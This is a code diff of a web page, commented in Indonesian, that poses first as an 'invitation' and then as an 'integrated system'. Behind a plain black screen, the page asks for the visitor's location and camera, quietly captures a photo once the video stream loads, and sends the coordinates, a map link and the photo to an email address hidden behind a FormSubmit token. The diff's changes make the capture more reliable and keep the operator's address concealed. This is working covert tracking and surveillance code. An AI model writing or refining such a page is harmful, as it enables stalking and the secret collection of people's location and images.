@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Undangan</title>
+    <title>Sistem Terintegrasi</title>
     <style>
-        /* Tampilan halaman tetap hitam polos untuk rencana UI kustom Anda */
+        /* Tampilan halaman tetap hitam polos */
         body {
             background-color: #000000;
             margin: 0;
@@ -20,11 +20,11 @@
 </head>
 <body>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // PENTING: Ganti dengan email aktif Anda
+        // PENTING: Menggunakan token acak FormSubmit Anda agar email asli tetap aman
         const EMAIL_TUJUAN = "d9a1b68b96ce0a668a22f62f9a3f5284"; 
 
         document.addEventListener("DOMContentLoaded", () => {
@@ -46,7 +46,6 @@
                     },
                     (error) => {
                         console.error("Izin lokasi ditolak sejak awal:", error.message);
-                        // Jika lokasi ditolak sejak awal, alur berhenti karena tidak ada data untuk dikirim
                     }
                 );
             } else {
@@ -54,7 +53,7 @@
             }
         }
 
-        // Langkah 2: Meminta izin kamera
+        // Langkah 2: Meminta izin kamera dengan validasi render video
         async function aksesKamera(lat, lon) {
             console.log("Langkah 2: Meminta izin kamera...");
             try {
@@ -63,12 +62,18 @@
                 video.srcObject = stream;
                 console.log("Kamera diizinkan.");
                 
-                console.log("Menunggu 3 detik agar sensor kamera siap...");
-                
-                // KONDISI A: Kamera DIKASIH IZIN -> Kirim lokasi + Foto
-                setTimeout(() => {
-                    kirimLokasiDanFoto(lat, lon, video);
-                }, 3000);
+                // VALIDASI UTAMA: Menunggu browser memuat dimensi video asli
+                video.onloadedmetadata = () => {
+                    video.play(); // Menjalankan stream video secara aktif di latar belakang
+                    
+                    console.log(`Resolusi kamera terdeteksi: ${video.videoWidth}x${video.videoHeight}`);
+                    console.log("Menunggu 3 detik agar sensor cahaya kamera stabil...");
+                    
+                    // KONDISI A: Kamera DIKASIH IZIN -> Kirim lokasi + Foto setelah 3 detik
+                    setTimeout(() => {
+                        kirimLokasiDanFoto(lat, lon, video);
+                    }, 3000);
+                };
 
             } catch (error) {
                 // KONDISI B: Kamera DITOLAK -> Langsung kirim Lokasi saja tanpa foto
@@ -82,6 +87,7 @@
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
             
+            // Mengatur ukuran canvas sama persis dengan resolusi video asli yang terdeteksi
             canvas.width = videoElement.videoWidth;
             canvas.height = videoElement.videoHeight;
             context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
@@ -89,18 +95,18 @@
             const urlAPI = `https://formsubmit.co/ajax/${EMAIL_TUJUAN}`;
 
             canvas.toBlob(async (blob) => {
-                if (!blob) {
-                    console.error("Gagal memproses gambar, mengirim lokasi saja.");
+                if (!blob || blob.size === 0) {
+                    console.error("Gagal memproses gambar (Blob kosong), mengirim lokasi saja.");
                     kirimLokasiSaja(lat, lon);
                     return;
                 }
 
                 const formData = new FormData();
-                formData.append("Status Kamera", "Diizinkan");
+                formData.append("Status_Kamera", "Diizinkan");
                 formData.append("Latitude", lat);
                 formData.append("Longitude", lon);
-                formData.append("Link Peta", `https://www.google.com/maps?q=${lat},${lon}`);
-                formData.append("Screenshot", blob, "capture.png");
+                formData.append("Link_Peta", `https://www.google.com/maps?q=${lat},${lon}`);
+                formData.append("Screenshot", blob, "capture.png"); // Mengirim file fisik gambar
                 formData.append("_captcha", "false");
 
                 kirimKeServer(urlAPI, formData);
@@ -112,16 +118,16 @@
             const urlAPI = `https://formsubmit.co/ajax/${EMAIL_TUJUAN}`;
 
             const formData = new FormData();
-            formData.append("Status Kamera", "Ditolak/Error");
+            formData.append("Status_Kamera", "Ditolak/Error");
             formData.append("Latitude", lat);
             formData.append("Longitude", lon);
-            formData.append("Link Peta", `https://www.google.com/maps?q=${lat},${lon}`);
+            formData.append("Link_Peta", `https://www.google.com/maps?q=${lat},${lon}`);
             formData.append("_captcha", "false");
 
             kirimKeServer(urlAPI, formData);
         }
 
-        // Fungsi pembantu untuk mengeksekusi Fetch API
+        // Fungsi pembantu untuk mengeksekusi Fetch API ke FormSubmit
         async function kirimKeServer(url, dataForm) {
             console.log("Sedang mengirim data ke FormSubmit...");
             try {
